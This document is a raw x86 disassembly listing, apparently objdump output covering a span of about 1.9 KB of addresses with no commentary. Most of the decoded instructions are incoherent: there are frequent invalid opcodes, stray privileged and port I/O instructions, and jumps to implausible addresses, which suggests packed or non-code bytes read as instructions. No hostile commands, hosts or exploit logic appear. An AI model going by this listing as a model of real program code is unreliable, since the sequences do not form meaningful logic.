  431c8e:	add    DWORD PTR [ebx],eax
  431c90:	jb     0x431ccd
  431c92:	add    BYTE PTR [edi],cl
  431c94:	inc    ebp
  431c95:	imul   eax,edi,0x858bd800
  431c9b:	cld    
  431c9c:	clc    
  431c9d:	mov    DWORD PTR [ebp+0x0],eax
  431ca0:	inc    DWORD PTR [eax]
  431ca2:	or     al,0xde
  431ca4:	sbb    bh,0x1
  431ca7:	retf   
  431ca8:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431caf:	dec    ebp
  431cb0:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431cb6:	enter  0x12de,0xdf
  431cba:	inc    ebp
  431cbb:	pop    ebp
  431cbc:	dec    DWORD PTR [ebx-0x257f0ff4]
  431cc2:	add    DWORD PTR [edx],edx
  431cc4:	add    BYTE PTR [ebp+0x50],dl
  431cc7:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431ccd:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431cd3:	or     ah,al
  431cd5:	pop    ss
  431cd6:	cdq    
  431cd7:	push   ebp
  431cd8:	clc    
  431cd9:	mov    eax,DWORD PTR [ebp-0x4]
  431cdc:	xor    edx,edx
  431cde:	add    esi,DWORD PTR [ebx]
  431ce0:	cmp    eax,DWORD PTR [ebx]
  431ce2:	hlt    
  431ce3:	cmp    DWORD PTR [ebx],esp
  431ce5:	or     al,BYTE PTR [ebp+0xf]
  431ce8:	mov    eax,DWORD PTR [edx]
  431cea:	loopne 0x431cec
  431cec:	(bad)  
  431ced:	mov    ecx,esi
  431cef:	cld    
  431cf0:	pushf  
  431cf1:	pop    ebp
  431cf2:	fwait
  431cf3:	mov    esi,DWORD PTR [edx]
  431cf5:	lock mov eax,eax
  431cf8:	adc    BYTE PTR [ebx],al
  431cfa:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431d01:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431d07:	dec    ebp
  431d08:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431d0e:	(bad)  
  431d0f:	iret   
  431d10:	inc    ebp
  431d11:	(bad)  
  431d12:	jne    0x431d61
  431d14:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431d1a:	(bad)  
  431d1b:	cmp    ebx,eax
  431d1d:	je     0x431ca5
  431d1f:	add    edi,edi
  431d21:	or     bh,bh
  431d23:	dec    ebp
  431d24:	inc    ebp
  431d25:	mov    esi,DWORD PTR [ebx]
  431d27:	cld    
  431d28:	add    ecx,esi
  431d2a:	cmp    ecx,DWORD PTR [eax-0xc]
  431d2d:	mov    edx,DWORD PTR [edi]
  431d2f:	or     BYTE PTR [ebp-0x7c],al
  431d32:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431d38:	test   BYTE PTR [ebx+ebx*4],cl
  431d3b:	inc    ebp
  431d3c:	xor    bh,BYTE PTR [esi]
  431d3e:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431d45:	jne    0x431d0e
  431d47:	mov    ebp,esp
  431d49:	fcomp  DWORD PTR [ebx]
  431d4b:	add    BYTE PTR [ecx],al
  431d4d:	inc    DWORD PTR [ebp-0x75]
  431d50:	(bad)  
  431d51:	cld    
  431d52:	add    al,0xce
  431d54:	mov    ecx,edi
  431d56:	cld    
  431d57:	inc    ebp
  431d58:	fidivr WORD PTR [ebx]
  431d5a:	fbstp  TBYTE PTR [ebp-0x3e]
  431d5d:	mov    eax,DWORD PTR [eax]
  431d5f:	adc    BYTE PTR [ebx-0x3974038b],cl
  431d65:	fadd   st,st(7)
  431d67:	add    BYTE PTR [ebp-0x1],al
  431d6a:	mov    ecx,DWORD PTR [esp+edi*8]
  431d6d:	inc    ebp
  431d6e:	mov    bh,0xc7
  431d71:	loopne 0x431db8
  431d73:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431d79:	sbb    dh,BYTE PTR [ebx]
  431d7b:	pushf  
  431d7c:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d82:	mov    eax,edi
  431d84:	cwde   
  431d85:	inc    ebp
  431d86:	inc    ebp
  431d87:	jne    0x431d14
  431d89:	mov    esp,esp
  431d8b:	clc    
  431d8c:	add    al,0x4d
  431d8e:	mov    DWORD PTR [ebx],esi
  431d90:	or     al,0x33
  431d92:	inc    ebp
  431d93:	lea    ecx,[ebx-0x398d13fd]
  431d99:	add    bh,al
  431d9b:	inc    ebp
  431d9c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431da3:	add    ebp,esp
  431da5:	shufps xmm1,xmm3,0xc7
  431da9:	(bad)  
  431daa:	jmp    0x748858d3
  431daf:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431db5:	hlt    
  431db6:	mov    ecx,DWORD PTR [edi]
  431db8:	fadd   DWORD PTR [ebp+0x0]
  431dbb:	xor    ecx,DWORD PTR [edi]
  431dbd:	add    ecx,ecx
  431dbf:	cmp    edi,edi
  431dc1:	pmuludq mm7,QWORD PTR [edx+0x50]
  431dc5:	(bad)  
  431dc6:	jmp    0x431d53
  431dc8:	mov    edi,esp
  431dca:	or     al,0xc6
  431dcc:	inc    ebp
  431dcd:	(bad)  
  431dce:	mov    eax,DWORD PTR [ebp+0x10]
  431dd1:	jne    0x431d5c
  431dd3:	mov    eax,DWORD PTR [ecx]
  431dd5:	clc    
  431dd6:	add    BYTE PTR [ebp-0x40],cl
  431dd9:	xor    edx,DWORD PTR [eax-0x73]
  431ddc:	jne    0x431ddf
  431dde:	push   DWORD PTR [edx+0x8]
  431de1:	add    BYTE PTR [ebp+0x45],al
  431de4:	mov    ebp,ecx
  431de6:	cld    
  431de7:	add    BYTE PTR [ebp+0x0],cl
  431dea:	xor    eax,DWORD PTR [ebp+0x3]
  431ded:	mov    DWORD PTR [ebx],edi
  431def:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431df5:	sub    eax,0x5d330e4d
  431dfa:	lea    esi,[ebx]
  431dfc:	add    DWORD PTR [ebx],eax
  431dfe:	jb     0x431de9
  431e00:	add    BYTE PTR [eax],al
  431e02:	inc    ebp
  431e03:	add    bl,ch
  431e05:	inc    ebp
  431e06:	mov    esi,DWORD PTR [ebx]
  431e08:	or     al,0x3
  431e0a:	(bad)  
  431e0b:	mov    edi,eax
  431e0d:	in     al,dx
  431e0e:	scas   eax,DWORD PTR es:[edi]
  431e0f:	inc    ebp
  431e10:	mov    esi,DWORD PTR [ebx]
  431e12:	in     al,0x3
  431e14:	add    al,0x89
  431e16:	mov    ecx,DWORD PTR [eax+edi*8]
  431e19:	dec    ebp
  431e1a:	(bad)  
  431e1b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431e22:	mov    ecx,eax
  431e24:	cld    
  431e25:	push   es
  431e26:	dec    ebp
  431e27:	add    al,0x33
  431e29:	mov    DWORD PTR [ebx],eax
  431e2b:	in     al,dx
  431e2c:	cmp    DWORD PTR [ebp-0x67],eax
  431e2f:	mov    eax,DWORD PTR [ebp-0xba0068]
  431e35:	mov    edx,DWORD PTR [ebp-0x4]
  431e38:	mov    ecx,DWORD PTR [ebp-0x2c]
  431e3b:	xor    eax,DWORD PTR [ebp+0x3]
  431e3e:	cmp    DWORD PTR [ebx],0x8b32749a
  431e44:	xor    edi,esp
  431e46:	jmp    0xff771b98
  431e4b:	add    ecx,DWORD PTR [ebp-0x3f]
  431e4e:	xor    ebx,DWORD PTR [edi]
  431e50:	add    eax,ecx
  431e52:	cmp    ebx,DWORD PTR [eax]
  431e54:	mov    ecx,DWORD PTR [ebp-0x4]
  431e57:	mov    ecx,DWORD PTR [eax]
  431e59:	adc    BYTE PTR [ebp-0x80],al
  431e5c:	jmp    0x431e5f
  431e5e:	mov    eax,DWORD PTR [eax]
  431e60:	cld    
  431e61:	mov    bh,0xc6
  431e63:	push   ecx
  431e64:	(bad)  
  431e65:	jne    0x431ec5
  431e67:	dec    ecx
  431e69:	or     BYTE PTR [ecx+ebx*1],cl
  431e6c:	push   ebp
  431e6d:	inc    ebp
  431e6e:	in     al,dx
  431e6f:	add    ebp,esp
  431e71:	or     bh,al
  431e73:	dec    ebp
  431e74:	cld    
  431e75:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431e7b:	xor    DWORD PTR [edx],0x2
  431e7e:	pushf  
  431e7f:	dec    DWORD PTR [ebx+0x45510cf4]
  431e85:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e8b:	mov    edx,DWORD PTR [ecx+0xc]
  431e8e:	xor    eax,esi
  431e90:	mov    edx,0xc172c7
  431e95:	inc    ebp
  431e96:	mov    esi,DWORD PTR [ebp+0x8]
  431e99:	mov    eax,edx
  431e9b:	call   0x84c7e590
  431ea0:	add    DWORD PTR [ebx-0x76bace00],ebx
  431ea6:	mov    ebp,eax
  431ea8:	or     BYTE PTR [eax],dl
  431eaa:	jo     0x431ef9
  431eac:	push   edi
  431ead:	xor    esi,DWORD PTR [ebp+0x3]
  431eb0:	(bad)  
  431eb1:	pmulhuw mm0,mm1
  431eb4:	test   DWORD PTR [ebp-0x8],ecx
  431eb7:	mov    DWORD PTR [ebp-0x67],eax
  431eba:	mov    eax,DWORD PTR [ebp-0x4]
  431ebd:	xor    edi,DWORD PTR [ebp-0x73]
  431ec0:	xor    eax,DWORD PTR [ebx]
  431ec2:	xor    esi,DWORD PTR [edx+0x3]
  431ec5:	add    BYTE PTR [ecx],bh
  431ec7:	inc    ebp
  431ec8:	(bad)  
  431ec9:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431ecf:	mov    DWORD PTR [eax],0x750f0004
  431ed5:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431edb:	lock add BYTE PTR [ebp+0x0],cl
  431edf:	mov    esi,DWORD PTR [ebp-0x18]
  431ee2:	mov    ebp,edx
  431ee4:	or     al,0x72
  431ee6:	ja     0x431ee8
  431ee8:	mov    edx,esi
  431eea:	cld    
  431eeb:	(bad)  
  431eee:	cli    
  431eef:	mov    esi,DWORD PTR [ebp-0x4]
  431ef2:	cmp    ecx,esi
  431ef4:	bswap  edi
  431ef6:	(bad)
  431efa:	mov    esi,DWORD PTR [ebp-0x4]
  431efd:	mov    esi,ecx
  431eff:	clc    
  431f00:	repnz add esi,DWORD PTR [ebp+0x45]
  431f04:	push   ebx
  431f05:	xor    eax,DWORD PTR [ebp+0x3]
  431f08:	cmp    al,0x5f
  431f0a:	pushf  
  431f0b:	pop    ebx
  431f0c:	jmp    0x431fd3
  431f11:	mov    esi,DWORD PTR [ebp-0x7d]
  431f14:	xor    ebp,DWORD PTR [eax]
  431f16:	lea    eax,[ebp-0x8]
  431f19:	xor    edx,esi
  431f1b:	pushf  
  431f1c:	out    dx,eax
  431f1d:	(bad)  
  431f1e:	neg    eax
  431f20:	ins    DWORD PTR es:[edi],dx
  431f21:	test   esi,edi
  431f23:	clc    
  431f24:	pop    esp
  431f25:	inc    ebp
  431f26:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431f2c:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431f32:	add    cl,al
  431f34:	jne    0x431ed1
  431f36:	mov    esi,DWORD PTR [edx]
  431f38:	in     al,dx
  431f39:	push   esi
  431f3a:	xor    BYTE PTR [ebp-0xe],dh
  431f3d:	add    edi,esi
  431f3f:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431f45:	add    cl,bh
  431f47:	mov    edi,DWORD PTR [ebp+0x8]
  431f4a:	mov    DWORD PTR [ebp-0x14],esi
  431f4d:	add    esi,DWORD PTR [ebp+0x3c]
  431f50:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431f56:	mov    ah,0x3e
  431f58:	fwait
  431f59:	pushf  
  431f5a:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431f60:	jne    0x431eed
  431f62:	mov    ecx,DWORD PTR [esp+ebp*8]
  431f65:	icebp  
  431f66:	icebp  
  431f67:	shl    edx,0xf2
  431f6a:	(bad)  
  431f6b:	mov    ah,0x16
  431f6d:	push   eax
  431f6e:	jne    0x431f03
  431f70:	mov    ecx,DWORD PTR [edi]
  431f72:	in     al,dx
  431f73:	jmp    0x431f66
  431f75:	add    dl,dh
  431f77:	mov    edi,esi
  431f79:	or     al,0x8
  431f7b:	inc    ebp
  431f7c:	jne    0x431f81
  431f7e:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f84:	ret    
  431f85:	or     bh,bh
  431f87:	jge    0x431f71
  431f89:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431f8f:	xor    edi,eax
  431f91:	add    esi,DWORD PTR [ebp-0x77]
  431f94:	mov    ebx,esp
  431f96:	clc    
  431f97:	neg    DWORD PTR [ebp-0x7c]
  431f9a:	xor    eax,DWORD PTR [eax]
  431f9c:	cmp    eax,DWORD PTR [eax]
  431f9e:	repz jne 0x431f36
  431fa1:	xor    eax,DWORD PTR [ecx]
  431fa3:	add    ebx,DWORD PTR [eax]
  431fa5:	mov    DWORD PTR [ebp-0x8],eax
  431fa8:	mov    eax,edi
  431faa:	cld    
  431fab:	lock pop eax
  431fad:	test   DWORD PTR [ebx],esi
  431faf:	clc    
  431fb0:	add    edx,DWORD PTR [edi-0x740bff77]
  431fb6:	fdivp  st(4),st
  431fb8:	test   ecx,esi
  431fba:	(bad)  
  431fbb:	jnp    0x431fbc
  431fbd:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431fc3:	jae    0x431f50
  431fc5:	sub    edi,esp
  431fc7:	(bad)  
  431fc8:	shl    DWORD PTR [eax-0x3e],0x89
  431fcc:	leave  
  431fcd:	call   0x8198d6da
  431fd2:	in     al,dx
  431fd3:	(bad)  
  431fd4:	in     al,dx
  431fd5:	add    bh,al
  431fd7:	mov    esp,edi
  431fd9:	in     al,dx
  431fda:	test   DWORD PTR [ebp-0x8],edi
  431fdd:	mov    eax,DWORD PTR [ebp+0x2b]
  431fe0:	xor    al,BYTE PTR [ebx]
  431fe2:	pushf  
  431fe3:	jnp    0x57321c1c
  431fe9:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431fed:	loopne 0x432022
  431fef:	jne    0x431fac
  431ff1:	mov    esi,DWORD PTR [edx-0x20]
  431ff4:	add    BYTE PTR [ebp-0x3d],bh
  431ff7:	xor    eax,DWORD PTR [ebp-0x73]
  431ffa:	mov    edi,DWORD PTR [esi]
  431ffc:	cld    
  431ffd:	jb     0x431fc5
  431fff:	add    bl,al
  432001:	jne    0x432048
  432003:	mov    edx,DWORD PTR [edi-0x10]
  432006:	jge    0x432085
  432008:	mov    esi,DWORD PTR [ebx]
  43200a:	lock add ecx,DWORD PTR [ebp+0x3b]
  43200e:	xor    esi,DWORD PTR [ebp-0x77]
  432011:	mov    esi,eax
  432013:	lock inc ebp
  432015:	jge    0x432048
  432017:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  43201e:	dec    ebp
  43201f:	mov    esi,DWORD PTR [ebx]
  432021:	loopne 0x431fac
  432023:	jge    0x43201d
  432025:	add    DWORD PTR [ebp-0x7d],eax
  432028:	icebp  
  432029:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  432030:	dec    ebp
  432031:	hlt    
  432032:	xor    ebx,DWORD PTR [ebp-0x77]
  432035:	mov    esi,esp
  432037:	in     al,0x45
  432039:	jge    0x432078
  43203b:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  432042:	dec    ebp
  432043:	push   esp
  432044:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  43204a:	inc    ebp
  43204b:	hlt    
  43204c:	xor    DWORD PTR [ebp-0x61],esi
  43204f:	mov    edi,DWORD PTR [eax+0xf19504]
  432055:	repnz mov DWORD PTR [ebp+0x20],ebx
  432059:	cmp    eax,DWORD PTR [ebp+0xf]
  43205c:	test   DWORD PTR [edi+ecx*1-0x1],edx
  432060:	fistp  WORD PTR [ebx+0x0]
  432063:	inc    ebp
  432064:	mov    ebx,DWORD PTR [edi+0xc]
  432067:	add    eax,eax
  432069:	inc    ebp
  43206a:	test   BYTE PTR [ebx],dh
  43206c:	add    eax,DWORD PTR [ebx]
  43206e:	add    BYTE PTR [esi+0x45],bl
  432071:	ret    0x85
  432074:	jnp    0x5443a443
  43207a:	inc    bp
  43207c:	inc    ebp
  43207d:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432083:	fdiv   QWORD PTR [ebx]
  432085:	test   DWORD PTR [ecx+0x453bf8],edi
  43208b:	push   ebx
  43208c:	add    edi,DWORD PTR [esi+0x708088b]
  432092:	cmp    esi,eax
  432094:	setnp  BYTE PTR [ecx-0x74fcffce]
  43209b:	mov    esp,edi
  43209d:	call   0x33ce65ef
  4320a2:	or     BYTE PTR [ebx],al
  4320a4:	inc    ecx
  4320a5:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  4320ab:	and    BYTE PTR [ebp-0x7074f0bb],al
  4320b1:	lock add cl,al
  4320b4:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  4320bb:	mov    ch,0x45
  4320bd:	clc    
  4320be:	xor    eax,DWORD PTR [ebp+0x3]
  4320c1:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4320c7:	inc    ebp
  4320c8:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4320ce:	mov    edi,eax
  4320d0:	mov    eax,DWORD PTR [ebp+0x3c]
  4320d3:	mov    ecx,DWORD PTR [eax]
  4320d5:	hlt    
  4320d6:	inc    ebp
  4320d7:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4320de:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4320e4:	push   ebp
  4320e5:	mov    edi,DWORD PTR [ebx]
  4320e7:	in     al,dx
  4320e8:	jne    0x4320ab
  4320ea:	mov    eax,DWORD PTR [ebp-0x28]
  4320ed:	add    DWORD PTR [eax],0xe8058dec
  4320f3:	clc    
  4320f4:	mov    esi,DWORD PTR [edi-0x8]
  4320f7:	add    dh,dl
  4320f9:	rol    WORD PTR [ebp-0x1],cl
  4320fd:	mov    edx,DWORD PTR [eax+0x8]
  432100:	jne    0x4320c2
  432102:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432109:	inc    ebp
  43210a:	push   esp
  43210b:	test   DWORD PTR [ecx+0xf],ecx
  43210e:	sub    edx,esp
  432110:	add    eax,DWORD PTR [eax]
  432112:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432118:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  43211f:	mov    eax,DWORD PTR [ecx]
  432121:	and    BYTE PTR [eax],al
  432123:	cmp    al,0x10
  432125:	add    BYTE PTR [ebp+0x66],al
  432128:	inc    ecx
  43212a:	push   esp
  43212b:	add    dh,BYTE PTR [ebp+0x0]
  43212e:	push   edx
  43212f:	enterw 0xc1,0x4d
  432134:	mov    esp,DWORD PTR [esi+0x20]
  432137:	add    DWORD PTR [ecx-0x7b],eax
  43213a:	add    eax,DWORD PTR [ebx]
  43213c:	str    WORD PTR [eax+0x45]
  432140:	lea    ecx,[ebx+0x45890801]
  432146:	sbb    BYTE PTR [ebx],al
  432148:	dec    ebp
  432149:	cmp    al,0xf
  43214b:	inc    ebp
  43214c:	push   eax
  43214d:	mov    esi,DWORD PTR [ebx]
  43214f:	push   eax
  432150:	add    eax,eax
  432152:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  432159:	inc    ebp
  43215a:	add    BYTE PTR [ecx],dh
  43215c:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  432163:	(bad)  
  432164:	mov    ebx,eax
  432166:	loopne 0x4321ad
  432168:	dec    ebp
  432169:	mov    ecx,DWORD PTR [edi]
  43216b:	cld    
  43216c:	push   eax
  43216d:	xchg   DWORD PTR [ebx],esi
  43216f:	add    DWORD PTR [ebx],ebp
  432171:	add    BYTE PTR [ebx],ch
  432173:	or     BYTE PTR [ecx],bh
  432175:	dec    ecx
  432176:	loopne 0x43217b
  432178:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  43217e:	push   ebp
  43217f:	add    DWORD PTR [ebx+0x55100800],eax
  432185:	dec    ebp
  432186:	jmp    0x432111
  432188:	mov    esp,DWORD PTR [eax]
  43218a:	sbb    dl,dl
  43218c:	inc    eax
  43218d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432193:	add    BYTE PTR [ebx+0x74528555],cl
  432199:	push   ebp
  43219a:	div    DWORD PTR [ebx]
  43219c:	and    eax,DWORD PTR [ebx]
  43219e:	add    edx,DWORD PTR [edx-0x30]
  4321a1:	jno    0x43212e
  4321a3:	inc    DWORD PTR [eax+eiz*1]
  4321a6:	inc    ebp
  4321a7:	push   eax
  4321a8:	push   eax
  4321a9:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4321af:	mov    edi,esp
  4321b1:	push   eax
  4321b2:	inc    ebp
  4321b3:	enter  0x458b,0x8
  4321b7:	push   ecx
  4321b8:	(bad)  
  4321b9:	call   0x10d2b91
  4321be:	pop    ss
  4321bf:	push   ebp
  4321c0:	mov    ecx,DWORD PTR [ebx+0x489408]
  4321c6:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4321cc:	push   ecx
  4321cd:	jo     0x4321b7
  4321cf:	inc    DWORD PTR [edi]
  4321d1:	or     BYTE PTR [eax],al
  4321d3:	call   0xce291d
  4321d8:	fmul   QWORD PTR [ebp+0x55]
  4321db:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4321e1:	mov    bh,0x8c
  4321e3:	adc    al,0x9b
  4321e5:	dec    esp
  4321e6:	xor    bl,BYTE PTR [eax]
  4321e8:	mov    ecx,DWORD PTR [ebp+0xc]
  4321eb:	mov    eax,DWORD PTR [ebp-0x4]
  4321ee:	mov    esi,DWORD PTR [edi-0x3148f924]
  4321f4:	push   es
  4321f5:	retf   
  4321f6:	mov    BYTE PTR [ebp-0x30],0x3b
  4321fa:	inc    ebp
  4321fb:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432202:	retf   0x83fc
  432205:	into   
  432206:	dec    ebp
  432207:	retf   
  432208:	mov    ecx,DWORD PTR [ebp-0x74]
  43220b:	mov    eax,DWORD PTR [eax]
  43220d:	fdiv   QWORD PTR [ebx]
  43220f:	mov    bh,0x3
  432211:	push   es
  432212:	mov    esi,ecx
  432214:	sbb    cl,dl
  432216:	dec    ebp
  432217:	sar    DWORD PTR [ebx],cl
  432219:	push   ebp
  43221a:	jne    0x43222b
  43221c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  432222:	lea    ebx,[eax]
  432224:	call   0xf4ccadeb
  432229:	sbb    dh,dl
  43222b:	add    edx,ebx
  43222d:	push   ebp
  43222e:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  432234:	push   ecx
  432235:	mov    DWORD PTR [eax-0x30],edx
  432238:	test   DWORD PTR [edx],eax
  43223a:	xadd   esp,esi
  43223d:	pop    es
  43223e:	add    cl,dl
  432240:	mov    eax,ecx
  432242:	or     al,0x45
  432244:	(bad)  
  432245:	push   eax
  432246:	add    DWORD PTR [edx+0x0],eax
  432249:	add    ecx,DWORD PTR [ecx]
  43224b:	and    dh,cl
  43224d:	call   0xc72b1d
  432252:	add    DWORD PTR [ebp+0x0],edx
  432255:	mov    esp,DWORD PTR [ebp+0x18]
  432258:	add    BYTE PTR [eax+0x50],cl
  43225b:	xor    eax,DWORD PTR [eax]
  43225d:	add    esp,DWORD PTR [esi+0x3b]
  432260:	inc    ebp
  432261:	je     0x4321e6
  432263:	push   ecx
  432264:	dec    BYTE PTR [ebp-0x77]
  432267:	add    eax,esi
  432269:	or     al,0x5e
  43226b:	inc    eax
  43226c:	add    BYTE PTR [ebx],al
  43226e:	data16 and BYTE PTR [ebp+0x50],al
  432272:	sub    DWORD PTR [ecx],0xfffffff8
  432275:	add    BYTE PTR [ebp-0x75],ah
  432278:	add    BYTE PTR [eax],bl
  43227a:	enter  0x894d,0x8b
  43227e:	int3   
  43227f:	loopne 0x432243
  432281:	rol    BYTE PTR [eax],0x33
  432284:	lea    cx,[ebp+0xa]
  432288:	data16 jb 0x4322d0
  43228b:	add    BYTE PTR [ebx+0x44890855],cl
  432291:	sbb    ah,al
  432293:	inc    ebp
  432294:	cmp    al,0xf
  432296:	add    BYTE PTR [edx+0x66],dl
  432299:	xor    ecx,DWORD PTR [eax]
  43229b:	sub    eax,DWORD PTR [edx]
  43229d:	mov    eax,DWORD PTR [eax]
  43229f:	or     al,0x66
  4322a1:	ror    edx,cl
  4322a3:	dec    ebp
  4322a4:	inc    ebp
  4322a5:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4322ab:	cld    
  4322ac:	or     BYTE PTR [edi+0x4501dd],dl
  4322b2:	ret    0xecce
  4322b5:	retf   
  4322b6:	(bad)  
  4322b7:	dec    ebp
  4322b8:	mov    al,0x8b
  4322ba:	loopne 0x4322dc
  4322bc:	cmp    ecx,DWORD PTR [edx]
  4322be:	inc    ebp
  4322bf:	daa    
  4322c0:	loopne 0x432249
  4322c2:	in     al,dx
  4322c3:	add    edi,eax
  4322c5:	add    BYTE PTR [eax+0x3f52e155],bh
  4322cb:	push   ebp
  4322cc:	inc    ebp
  4322cd:	xor    ebx,edx
  4322cf:	add    ebp,esp
  4322d1:	push   edx
  4322d2:	push   bp
  4322d4:	inc    ebp
  4322d5:	(bad)  
  4322d6:	in     eax,dx
  4322d7:	push   esp
  4322d8:	(bad)  
  4322d9:	inc    edx
  4322db:	sbb    al,0x33
  4322dd:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4322e4:	add    BYTE PTR [ebp+0x46],0x8b
  4322e8:	jmp    0xf98b:0x100041c8
  4322ef:	xor    esi,DWORD PTR [edx+0x3]
  4322f2:	mov    ecx,DWORD PTR [edi]
  4322f4:	fmul   DWORD PTR [edx]
  4322f6:	add    BYTE PTR [eax],al
  4322f8:	lea    eax,[ebx-0x4700273c]
  4322fe:	add    al,0x4f
  432300:	pop    DWORD PTR [eax]
  432302:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432308:	push   edx
  432309:	inc    WORD PTR [ebp+0x8]
  43230d:	mov    eax,0x514f4d
  432312:	(bad)
  432316:	add    al,al
  432318:	xor    DWORD PTR [ebx-0x74baf730],eax
  43231e:	test   DWORD PTR [esi+0x74],esp
  432321:	inc    ebp
  432322:	mov    DWORD PTR [eax+0xa4e08],edi
  432328:	add    BYTE PTR [ecx-0x76c435bb],cl
  43232e:	or     dh,cl
  432330:	or     eax,0x8b8d5045
  432335:	inc    ebp
  432336:	mov    WORD PTR [ecx+0x3b8a00],?
  43233c:	jne    0x432371
  43233e:	mov    edi,DWORD PTR [edx+0x8f3b18]
  432344:	add    DWORD PTR [ebx],eax
  432346:	add    bh,bh
  432348:	adc    DWORD PTR [eax],ecx
  43234a:	adc    DWORD PTR [ebp+0x55],edi
  43234d:	push   es
  43234e:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  432354:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  43235b:	inc    ebp
  43235c:	mov    esp,edi
  43235e:	or     al,0xda
  432360:	push   eax
  432361:	(bad)  
  432362:	jne    0x432318
  432364:	call   0x3b1c53
  432369:	inc    ebp
  43236a:	sar    BYTE PTR [eax],0x84
  43236d:	in     al,dx
  43236e:	add    bh,al
  432370:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  432377:	(bad)  
  432378:	and    al,al
  43237a:	fs in  eax,dx
  43237c:	inc    DWORD PTR [ebp-0x7b]
  43237f:	jle    0x432390
  432381:	leave  
  432382:	scas   al,BYTE PTR es:[edi]
  432383:	inc    esp
  432384:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43238b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432392:	call   DWORD PTR [edi]
  432394:	shr    ah,0x84
  432397:	xchg   DWORD PTR [eax],eax
  432399:	add    DWORD PTR [eax],eax
  43239b:	add    bh,bh
  43239d:	dec    ebp
  43239e:	and    BYTE PTR [ecx-0x38],dl
  4323a1:	push   eax
  4323a2:	dec    DWORD PTR [ebx+0xfd885]
  4323a8:	mov    BYTE PTR [ebp+0x508bac00],cl
  4323ae:	mov    WORD PTR [ecx+0x0],ss
  4323b1:	lea    ecx,[ebx+0x108b20d8]
  4323b7:	mov    WORD PTR [edx],ds
  4323b9:	add    BYTE PTR [edi+0xff01ff],al
  4323bf:	mov    ecx,DWORD PTR [ebp-0x28]
  4323c2:	push   ecx
  4323c3:	shl    BYTE PTR [ebp+0x3a],0x8b
  4323c7:	inc    ebp
  4323c8:	in     al,0xeb
  4323ca:	jno    0x432357
  4323cc:	push   edx
  4323cd:	mov    DWORD PTR [eax-0x28],edx
  4323d0:	mov    eax,DWORD PTR [ebp+0x20]
  4323d3:	je     0x43235c
  4323d5:	mov    eax,DWORD PTR [ecx]
  4323d7:	sbb    BYTE PTR [eax],al
  4323d9:	pop    DWORD PTR [eax]
  4323db:	add    esi,eax
  4323dd:	add    bl,al
  4323df:	adc    DWORD PTR [edi],esi
  4323e1:	jmp    0x8bce7433
  4323e6:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4323ed:	jne    0x43237a
  4323ef:	mov    ecx,DWORD PTR [eax]
  4323f1:	in     al,0x75
  4323f3:	pop    DWORD PTR [ecx+0x5401]
  4323f9:	push   edx
  4323fa:	inc    DWORD PTR [ebx]
  4323fc:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432402:	add    BYTE PTR [edi+0x9],dl
  432405:	call   DWORD PTR [esi]
  432407:	and    dl,al
  432409:	and    bh,bh
  43240b:	inc    edi
  43240d:	test   eax,edx
  43240f:	sldt   ebx
  432412:	xor    al,BYTE PTR [eax]
  432414:	pushf  
  432415:	(bad)  
